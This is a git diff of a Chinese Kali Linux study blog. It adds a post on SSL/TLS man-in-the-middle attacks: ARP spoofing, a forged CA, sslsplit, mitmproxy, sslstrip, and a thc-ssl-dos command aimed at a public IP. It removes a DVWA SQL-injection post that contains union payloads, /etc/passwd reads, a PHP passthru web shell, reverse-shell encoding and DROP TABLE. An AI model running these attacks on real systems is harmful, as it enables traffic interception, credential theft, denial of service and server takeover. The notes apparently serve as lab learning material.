@@ -240,6 +240,300 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AD)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AD)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6/" itemprop="url">Kali Linux笔记(五十六)：SSL、TLS中间人攻击--伪造证书</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-24T15:08:48+08:00">
+                2020-01-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.2k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  5 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-中间人攻击"><a href="#1-中间人攻击" class="headerlink" title="1. 中间人攻击"></a>1. 中间人攻击</h4><ul>
+<li>攻击者位于客户端和服务器通信链路中<ul>
+<li>ARP（欺骗局域网内所有主机，误认中间人为网关）</li>
+<li>DHCP（若中间人物理连接距离小于DHCP服务器，中间人可开放DHCP服务）</li>
+<li>修改网关（理论上可行，实际上几乎不存在）</li>
+<li>修改DNS（设置DNS解析到中间人的服务上）</li>
+<li>修改HOSTS（本地域名解析文件，优先级高于网卡的DNS服务器）</li>
+<li>ICMP、STP、OSPF（ICMP的重定向、STP生成树协议、OSPF路由协议）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐STP:生成树协议
+1.多个核心层交换机的多线连接，容易形成环路
+2.多个核心层交换机的冗杂备份
+▲ 交换机物理上的环路，通过生成树协议控制，实现逻辑上的无环路</code></pre></blockquote>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=cd17jyxDRF09k8RBXC_RZE6TM74bLDooASryP01CbUNmIirmBN4FVZpWUv9zfFoVS4IJoCSpamScRHoQdctaV3hTYvbBDRvSLdspCZLctOJZx6mVEWxAQe3CXbvevSCX&file_name=/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB.PNG" alt="中间人攻击"></p>
+<ul>
+<li>加密流量</li>
+<li>攻击的前提<ul>
+<li>客户端已经信任伪造证书颁发机构</li>
+<li>攻击者控制了核发证书颁发机构</li>
+<li>客户端程序禁止了显示证书错误告警信息</li>
+<li>攻击者已经控制客户端，并强制其信任伪造证书</li>
+</ul>
+</li>
+<li>▲ ARP地址欺骗是实现中间人攻击的因素之一</li>
+</ul>
+<h4 id="2-SSLsplit"><a href="#2-SSLsplit" class="headerlink" title="2. SSLsplit"></a>2. SSLsplit</h4><ul>
+<li>SSLsplit（调用Openssl）<ul>
+<li>透明SSL/TLS中间人攻击工具</li>
+<li>对客户端伪装成服务器，对服务器伪装成普通客户端</li>
+<li>伪装服务器需要伪造证书</li>
+<li>支持SSL/TLS加密的SMTP、POP3、FTP等通信中间人攻击</li>
+</ul>
+</li>
+<li>利用openssl生成证书私钥<ul>
+<li><strong><code>🔺命令：openssl genrsa -out ca.key 2048</code></strong></li>
+</ul>
+</li>
+<li>利用私钥签名生成证书<ul>
+<li><strong><code>🔺命令：openssl req -new -x509 -days（证书时间） 1096 -key ca.key -out ca.crt</code></strong></li>
+<li>填写相关信息：Country、Province、Locality Name、Organization、Organizational Name、FQDN Name、Email Address</li>
+</ul>
+</li>
+<li>启用路由（中间人）/proc/sys/net/ipv4/ip_forward<ul>
+<li><strong><code>🔺命令：sysctl -w net.ipv4.ip_forward=1</code></strong></li>
+</ul>
+</li>
+<li>iptables端口转发规则<ul>
+<li><strong><code>🔺命令：iptables -t nat -F</code></strong>（清空当前所有规则）</li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</code></strong> </li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</code></strong></li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443</code></strong> #MSA </li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443</code></strong> #SMTPS </li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443</code></strong> #IMAPS </li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443</code></strong> #POP3S </li>
+<li><strong><code>🔺命令：iptables -t nat -L</code></strong>（查看添加的所有规则）</li>
+</ul>
+</li>
+<li>ARP欺骗<ul>
+<li>win7 → <strong><code>🔺命令：arp a（查看网关MAC地址）</code></strong></li>
+<li>Kali → <strong><code>🔺命令：arpspoof -l eth0 -t 1.1.1.2（目标主机） -r 1.1.1.1（欺骗的网关）</code></strong>▲ 2020.1.23修改-l参数为-i</li>
+</ul>
+</li>
+<li>启动SSLsplit<ul>
+<li><strong><code>🔺命令：mkdir -p test/logdir</code></strong></li>
+<li><strong><code>🔺命令：sslsplit -D（debug模式）-l（连接信息记录） connect.log -j（&quot;越狱目录&quot;） /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></strong></li>
+</ul>
+</li>
+<li>被害者访问taobao，baidu，mail.163.com</li>
+<li>查看日志和浏览器证书（connect.log，443.log，80.log）</li>
+<li>安装服务器根证书后再次访问<ul>
+<li>拷贝根证书到win7电脑上</li>
+<li>双击证书安装 → 受信任的根证书颁发机构</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐taobao的官网，除了https加密之外，还对数据进行加密（比如密码控件）
+⭐全站https和非全站https的区别，非全站https是指对登陆的账户和密码使用https登陆
+⭐可以通过grep 12334 * 去查看要查看的信息（搜索日志文件）</code></pre></blockquote>
+<h4 id="3-Mitmproxy"><a href="#3-Mitmproxy" class="headerlink" title="3. Mitmproxy"></a>3. Mitmproxy</h4><ul>
+<li>▲ 同样需要arp地址欺骗来实现SSL中间人攻击</li>
+<li>▲ 自动集成生成一张证书（同SSLsplit的证书不同）</li>
+<li>Bug：http(80)/https(443)只能在8080端口侦听</li>
+<li>iptables端口转发规则<ul>
+<li><strong><code>🔺命令：iptables -t nat -F</code></strong></li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080</code></strong></li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080</code></strong></li>
+</ul>
+</li>
+<li>启动mitmproxy<ul>
+<li><strong><code>🔺命令：mitmproxy -T --host -w mitmproxy.log</code></strong>（窗口记录流量）</li>
+<li>Tab 下一个信息/q 退出/也可以鼠标点击访问 </li>
+<li>▲ 2020.1.24 -T参数修改为 –mode transparent，-host参数被取消</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-SSLstrip"><a href="#4-SSLstrip" class="headerlink" title="4. SSLstrip"></a>4. SSLstrip</h4><ul>
+<li>▲ 同样需要arp地址欺骗来实现SSL中间人攻击</li>
+<li>与前两种工具不同，将客户端到中间人之间的流量变为明文</li>
+<li>自动生成sslstrip.log文件</li>
+<li><strong><code>🔺命令：sslstrip -l 8080</code></strong> ▲ 2020.1.24若无法转变，则会报建立安全连接失败</li>
+</ul>
+<h4 id="5-SSL-TLS拒绝服务攻击"><a href="#5-SSL-TLS拒绝服务攻击" class="headerlink" title="5. SSL/TLS拒绝服务攻击"></a>5. SSL/TLS拒绝服务攻击</h4><ul>
+<li>thc-ssl-dos<ul>
+<li>SSL协商加密对性能开销增加，大量握手请求会导致拒绝服务</li>
+<li>利用SSL secure Renegotiation特性，在单一TCP连接中生成数千个SSL重连接请求，造成服务器资源过载</li>
+<li>与流量式拒绝服务攻击不同，thc-ssl-dos可以利用ADSL线路打垮30G带宽的服务器</li>
+<li>服务器平均可以处理300次/秒SSL握手请求</li>
+<li>对SMTPS、POP3等服务同样有效</li>
+<li><strong><code>🔺命令：thc-ssl-dos 199.223.209.205 2083 --accept</code></strong> ▲ 2020.1.23 Target has disabled renegotiations.</li>
+</ul>
+</li>
+<li>对策<ul>
+<li>禁用SSL-Renegotiation、使用SSL Accelerator</li>
+<li>通过修改thc-ssl-dos代码，可以绕过以上对策</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%8C)%EF%BC%9AXSS/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -3366,342 +3660,6 @@ lsb_release -a</code></pre></blockquote>
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B9%9D)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B9%9D)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E6%B3%A8%E5%85%A5/" itemprop="url">Kali Linux笔记(四十九)：手动漏洞挖掘--SQL注入</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-14T20:11:22+08:00">
-                2020-01-14
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  1.6k 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  8 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-五种判断机制"><a href="#1-五种判断机制" class="headerlink" title="1. 五种判断机制"></a>1. 五种判断机制</h4><ul>
-<li>服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器（数据库调用或系统调用）</li>
-<li>用户登录判断<ul>
-<li>SELECT * FROM users WHERE user=’uname’ AND password=’password’</li>
-<li>SELECT * FROM users WHERE user=’uname’ AND password=”OR”=”</li>
-</ul>
-</li>
-<li>基于报错的检测方法（low）<ul>
-<li>‘ “ % ()</li>
-</ul>
-</li>
-<li>基于布尔的检测<ul>
-<li>1’ and ‘1’=’1 / 1’ and ‘1（真）</li>
-<li>1’ and ‘1’=’2 / 1’ and ‘0（假）</li>
-</ul>
-</li>
-<li>表列数/显示信息位于哪一列<ul>
-<li>‘order by 9–+（按查询列号排序）（注释符：–）</li>
-<li>select * 时表字段数=查询字段数</li>
-</ul>
-</li>
-<li>联合查询<ul>
-<li>‘union select 1,2–+ </li>
-<li>‘union all select database()/user()/version(),2– +</li>
-</ul>
-</li>
-<li>‘union select database(),substring index(USER(),”@”,1)–+（切分字段）</li>
-<li>DB用户：user() </li>
-<li>DB版本：version()</li>
-<li>全局函数：@@datadir、@@hostname、@@VERSION、@@version_compile_os</li>
-<li>当前库：database()</li>
-<li>ASCII转字符：char()</li>
-<li>连接字符串：CONCAT_WS(CHAR(32,58,32),user(),database(),version())</li>
-<li>计算哈希：md5()</li>
-<li>Mysql数据结构<ul>
-<li>information_schema</li>
-</ul>
-</li>
-<li>所有库所有表/统计每库中表的数量<ul>
-<li>‘union select table_name,table_schema from information_schema.tables–+</li>
-<li>‘union select table_schema,count(*) from information_schema.tables group by table_schema–+</li>
-</ul>
-</li>
-<li>Dvwa库中的表名<ul>
-<li>‘union select table_name,table_schema from information_schema.tables where table_schema=’dvwa’–+</li>
-</ul>
-</li>
-<li>Users表中的所有列（user_id,first_name,last_name,user,password,avatar）<ul>
-<li>‘union select table_name,column_name from information_schema.columns where table_schema=’dvwa’ and table_name=’users’–+</li>
-</ul>
-</li>
-<li>查询user、password列的内容<ul>
-<li>‘union select users,password from dvwa,users–+</li>
-<li>‘union select users,password from users–+</li>
-<li>‘union select null,concat(user,0x3a,password) from users–+ </li>
-</ul>
-</li>
-</ul>
-<h4 id="2-密码猜测"><a href="#2-密码猜测" class="headerlink" title="2. 密码猜测"></a>2. 密码猜测</h4><ul>
-<li>hash-identifier<ul>
-<li>输入猜测的值</li>
-</ul>
-</li>
-<li>密码破解<ul>
-<li>username:passhash–&gt;dvwa.txt</li>
-<li><strong><code>🔺命令：john --format=raw-MD5 dvwa.txt</code></strong>（存在./john文件）</li>
-</ul>
-</li>
-<li>显示之前破解的密码<ul>
-<li><strong><code>🔺命令：john --format=raw-MD5 dvwa.txt --show</code></strong></li>
-</ul>
-</li>
-</ul>
-<h4 id="3-系统文件读取-命令执行"><a href="#3-系统文件读取-命令执行" class="headerlink" title="3. 系统文件读取/命令执行"></a>3. 系统文件读取/命令执行</h4><ul>
-<li>读取文件<ul>
-<li>‘union select null,load_file(‘/etc/passwd’)–+</li>
-</ul>
-</li>
-<li>写入文件（原文件形式）<ul>
-<li>‘union select null,”<?php passthru($_GET['cmd']);?>“INTO DUMPFILE “a.php”–+（dumpfile到默认目录，默认目录只有mysql有权限）</li>
-<li>‘union select null,”<?php passthru($_GET['cmd']);?>“INTO DUMPFILE “/var/www/a.php”–+（dumpfile到指定目录）</li>
-<li><ul>
-<li>▲ 脚本可以写到具有777权限的/tmp目录，结合SQL注入和File Inclusion达到作用</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>写入文件（十六进制模式）<ul>
-<li><strong><code>🔺命令：cp /usr/share/webshells/php/php-reverse-shell.php ./b.php</code></strong></li>
-<li><strong><code>🔺命令：cat php-reverse-shell.php | xxd -ps | tr -d &#39;\n&#39;</code></strong>（▲ 十六进制编码的shell）</li>
-<li>‘union select null,+(0x十六进制编码) INTO DUMPFILE ‘/tmp/x.php’–+</li>
-<li>可能受到服务器GET大小的限制，传输不成功</li>
-</ul>
-</li>
-<li>保存下载数据库<ul>
-<li>‘union select null,concat(user,0x3a,password) from users INTO OUTFILE ‘/tmp/a.db’–+</li>
-</ul>
-</li>
-<li>一个思路：编写服务器端代码</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,&apos;&lt;?php if(isset($_POST[&quot;submit&quot;])) &#123; $userID = $_POST[&quot;userID&quot;]; $first_name = $_POST[&quot;first_name&quot;]; $last_name = $_POST[&quot;last_name&quot;]; $username = $_POST[&quot;username&quot;]; $avatar = $_POST[&quot;avatar&quot;]; echo &quot;userID: $userID&lt;BR&gt;&quot;; echo &quot;first_name: $first_name&lt;BR&gt;&quot;; echo &quot;last_name: $last_name&lt;BR&gt;&quot;; echo &quot;username: $username&lt;BR&gt;&quot;; echo &quot;avatar: $avatar&lt;BR&gt;&quot;; $con=mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;&quot;,&quot;dvwa&quot;); if (mysqli_connect_errno()) &#123; echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); &#125; else &#123; echo &quot;Connected to database&lt;BR&gt;&quot;; &#125; $password = &quot;123&quot;; $sql=&quot;insert into dvwa.users values (\\&quot;$userID\\&quot;,\ \&quot;$first_name\\&quot;,\\&quot;$last_name\\&quot;,\\&quot;$username\\&quot;,MD5(\\&quot;$password\\&quot;),\\&quot;$avatar\ \&quot;)&quot;; if (mysqli_query($con,$sql)) &#123; echo &quot;[Successful Insertion]: $sql&quot;; &#125; else &#123; echo &quot;Error creating database: &quot; . mysqli_error($con); &#125; mysqli_close($con); &#125; ?&gt; &lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;]; ?&gt;&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;userID&quot; value=&quot;33&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;first_name&quot; value=&quot;fh&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;last_name&quot; value=&quot;y&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;yfh&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;avatar&quot; value=&quot;yfh!&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit Form&quot;&gt;&lt;br&gt; &lt;/form&gt;&apos; INTO DUMPFILE &apos;/tmp/user.php&apos; --</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-猜字段–无information-schema"><a href="#4-猜字段–无information-schema" class="headerlink" title="4. 猜字段–无information_schema"></a>4. 猜字段–无information_schema</h4><ul>
-<li>无权读取information_schema库/拒绝union、order by语句<ul>
-<li>猜列名：’and column is null–+（Burpsuite自动猜列名）</li>
-<li>猜当前表表名：’and table.user is null–+</li>
-<li>猜库里其他表：’and (select count(*) from table)&gt;0–+</li>
-<li>列表对应关系：’and users.user is null–+</li>
-<li>猜字段内容：’or user=’admin/‘or user like ‘%a%</li>
-<li>猜账号对应密码：’or user=’admin’ and password=’5f4dcc3b5aa765d61d8327deb832cf99（MD5值）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐之前的SQL注入教程，主要是针对mysql的root权限，如果得到的是mysql的一个普通用户的权限，则很难通过information_schema来查询以及执行指令
-⭐查找column字典
-find / -name *column*.txt
-cat /usr/share/golismero/tools/sqlmap/txt/common-colums.txt | gerp -v ^# &gt; column.txt
-⭐查找table表名
-find / -name *.table*.txt
-cat /usr/share/golismero/tools/sqlmap/txt/common-table.txt | gerp -v ^# &gt;table.txt
-⭐MD5作为字典
-md5sum common-password.txt password.txt</code></pre></blockquote>
-<h4 id="5-用户注入–无information-schema"><a href="#5-用户注入–无information-schema" class="headerlink" title="5. 用户注入–无information_schema"></a>5. 用户注入–无information_schema</h4><ul>
-<li>‘;update users set user=’yuanfh’ where user=’admin’<ul>
-<li>注入失败，sql客户端工具的问题</li>
-<li><a href="http://dev.mysql.com/doc/refman/5.7/en/commands-out-of-sync.html" target="_blank" rel="noopener">http://dev.mysql.com/doc/refman/5.7/en/commands-out-of-sync.html</a></li>
-</ul>
-</li>
-<li>‘;INSERT into users(‘user_id’,’first_name’,’last_name’,’user’,’password’,’avatar’)VALUES(‘35’,’fh’,’yuan’,’yfh’,’5f4dcc3b5aa765d61d8327deb882cf99’,’OK’);–+</li>
-<li>‘;DROP TABLE users;–+</li>
-<li>xp_cmdshell /存储过程</li>
-<li>▲ SQLi没有通用的方法，掌握原理，了解各种数据库特性 </li>
-</ul>
-<h4 id="6-DVWA的SQL注入源码"><a href="#6-DVWA的SQL注入源码" class="headerlink" title="6. DVWA的SQL注入源码"></a>6. DVWA的SQL注入源码</h4><ul>
-<li>Dvwa的SQL Injection Source（Low）</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;Submit&apos;]))&#123;</span><br><span class="line">    </span><br><span class="line">    // Retrieve data</span><br><span class="line">    </span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">    $result = mysql_query($getid) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i = 0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>Dvwa的SQL Injection Source（Medium）<ul>
-<li>对特殊字符的转义</li>
-<li>mysql_real_escape_srting()（PHP 4 &gt;=4.3.0，PHP5）</li>
-<li>PHP 5.5.0已经启用此函数</li>
-<li>PHP 7.0.0已经删除此函数，代之以MySQLi、PDO_M有、SQL</li>
-<li>转义字符（\x00、\n、\r、’、”、\x1a）</li>
-<li>▲ 绕过方法：不需要单引号，不需要–，直接插入语句即可</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id&quot;;</span><br><span class="line"></span><br><span class="line">    $result = mysql_query($getid) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">    </span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i=0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>Dvwa的SQL Injection Source（High）<ul>
-<li>stripslashes（去除”&quot;）</li>
-<li>mysql_real_escape_string</li>
-<li>▲ is_numric（判断是否为数字）</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = stripslashes($id);</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    if (is_numeric($id))&#123;</span><br><span class="line"></span><br><span class="line">        $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">        $result = mysql_query($getid) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">        $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">        